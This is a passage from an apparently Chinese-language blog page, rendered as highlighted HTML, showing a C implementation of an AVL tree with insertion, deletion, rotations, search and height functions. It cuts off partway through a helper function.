function_">RightRotation</span><span class="params">(AVLNode **node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private functions</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ADT_AVLTREE_AVLTREE_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源文件<code>AVLTree.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/9.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AVLTree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">AVLTree *<span class="title function_">AVLTreeCreate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    AVLTree *tree = (AVLTree *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLTree));</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tree-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    tree-&gt;size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroyRun</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLTreeDestroyRun(node-&gt;left);</span><br><span class="line">    AVLTreeDestroyRun(node-&gt;right);</span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroy</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// recursive destroy</span></span><br><span class="line">    AVLTreeDestroyRun(tree-&gt;root);</span><br><span class="line">    <span class="built_in">free</span>(tree);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insert and delete</span></span><br><span class="line">status <span class="title function_">AVLTreeInsert</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    status result = AVLTreeInsertRun(&amp;tree-&gt;root, data);</span><br><span class="line">    <span class="comment">// check status</span></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">true</span>) &#123;</span><br><span class="line">        tree-&gt;size++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * insert data into AVLTree</span></span><br><span class="line"><span class="comment"> * return true if insert successfully</span></span><br><span class="line"><span class="comment"> * return false if insert failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">status <span class="title function_">AVLTreeInsertRun</span><span class="params">(AVLNode **root, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *root = (AVLNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLNode));</span><br><span class="line">        <span class="keyword">if</span> (*root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line">        &#125;</span><br><span class="line">        (*root)-&gt;data = data;</span><br><span class="line">        (*root)-&gt;height = <span class="number">1</span>;</span><br><span class="line">        (*root)-&gt;left = (*root)-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*root)-&gt;data == data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;data &lt; data) &#123;</span><br><span class="line">        <span class="comment">// insert into right subtree</span></span><br><span class="line">        status result = AVLTreeInsertRun(&amp;(*root)-&gt;right, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after insert, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we insert into right subtree,</span></span><br><span class="line">        <span class="comment">// so rightHeight &gt;= leftHeight</span></span><br><span class="line">        <span class="keyword">if</span> (rightHeight - leftHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*root)-&gt;right-&gt;data &lt; data) &#123;</span><br><span class="line">                <span class="comment">// type RR</span></span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type RL</span></span><br><span class="line">                RightRotation(&amp;(*root)-&gt;right);</span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// insert into left subtree</span></span><br><span class="line">        status result = AVLTreeInsertRun(&amp;(*root)-&gt;left, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after insert, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we insert into left subtree,</span></span><br><span class="line">        <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">        <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*root)-&gt;left-&gt;data &gt; data) &#123;</span><br><span class="line">                <span class="comment">// type LL</span></span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type LR</span></span><br><span class="line">                LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// update height if abs(leftHeight - rightHeight) != 2</span></span><br><span class="line">    (*root)-&gt;height =</span><br><span class="line">            max(GetNodeHeight((*root)-&gt;left), GetNodeHeight((*root)-&gt;right)) +</span><br><span class="line">            <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeDelete</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    status result = AVLTreeDeleteRun(&amp;tree-&gt;root, data);</span><br><span class="line">    <span class="comment">// check status</span></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">true</span>) &#123;</span><br><span class="line">        tree-&gt;size--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeDeleteRun</span><span class="params">(AVLNode **root, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*root)-&gt;data == data) &#123;</span><br><span class="line">        <span class="comment">// find the node</span></span><br><span class="line">        <span class="keyword">if</span> ((*root)-&gt;left != <span class="literal">NULL</span> &amp;&amp; (*root)-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// left and right subtree both exist</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// find the min node in right subtree and replace the node</span></span><br><span class="line">            ElementType key = GetNodeMin((*root)-&gt;right);</span><br><span class="line">            (*root)-&gt;data = key;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// delete the min node in right subtree</span></span><br><span class="line">            <span class="comment">// In effect, the question is shifted to deleting the min node in right subtree</span></span><br><span class="line">            AVLTreeDeleteRun(&amp;(*root)-&gt;right, key);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">            <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">            <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">            <span class="comment">// in this case, we delete the min node in right subtree,</span></span><br><span class="line">            <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">            <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">                <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;left-&gt;left) &gt;=</span><br><span class="line">                    GetNodeHeight((*root)-&gt;left-&gt;right)) &#123;</span><br><span class="line">                    <span class="comment">// type LL</span></span><br><span class="line">                    RightRotation(root);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// type LR</span></span><br><span class="line">                    LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                    RightRotation(root);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// left subtree is empty</span></span><br><span class="line">            AVLNode *temp = *root;</span><br><span class="line">            *root = (*root)-&gt;right;</span><br><span class="line">            <span class="built_in">free</span>(temp);</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// right subtree is empty</span></span><br><span class="line">            AVLNode *temp = *root;</span><br><span class="line">            *root = (*root)-&gt;left;</span><br><span class="line">            <span class="built_in">free</span>(temp);</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;data &lt; data) &#123;</span><br><span class="line">        <span class="comment">// find in right subtree</span></span><br><span class="line">        status result = AVLTreeDeleteRun(&amp;(*root)-&gt;right, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we delete in right subtree,</span></span><br><span class="line">        <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">        <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">            <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;left-&gt;left) &gt;=</span><br><span class="line">                GetNodeHeight((*root)-&gt;left-&gt;right)) &#123;</span><br><span class="line">                <span class="comment">// type LL</span></span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type LR</span></span><br><span class="line">                LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// find in left subtree</span></span><br><span class="line">        status result = AVLTreeDeleteRun(&amp;(*root)-&gt;left, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we delete in left subtree,</span></span><br><span class="line">        <span class="comment">// so rightHeight &gt;= leftHeight</span></span><br><span class="line">        <span class="keyword">if</span> (rightHeight - leftHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">            <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;right-&gt;right) &gt;=</span><br><span class="line">                GetNodeHeight((*root)-&gt;right-&gt;left)) &#123;</span><br><span class="line">                <span class="comment">// type RR</span></span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type RL</span></span><br><span class="line">                RightRotation(&amp;(*root)-&gt;right);</span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update height if abs(leftHeight - rightHeight) != 2 (?)</span></span><br><span class="line">    (*root)-&gt;height =</span><br><span class="line">            max(GetNodeHeight((*root)-&gt;left), GetNodeHeight((*root)-&gt;right)) +</span><br><span class="line">            <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search</span></span><br><span class="line">status <span class="title function_">AVLTreeSearch</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;data &gt; data) &#123;</span><br><span class="line">            node = node-&gt;left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = node-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get max and min</span></span><br><span class="line">status <span class="title function_">AVLTreeGetMax</span><span class="params">(AVLTree *tree, ElementType *result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    *result = node-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeGetMin</span><span class="params">(AVLTree *tree, ElementType *result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    *result = node-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get status</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetHeight</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;root-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetNodeHeight</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">GetNodeMax</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 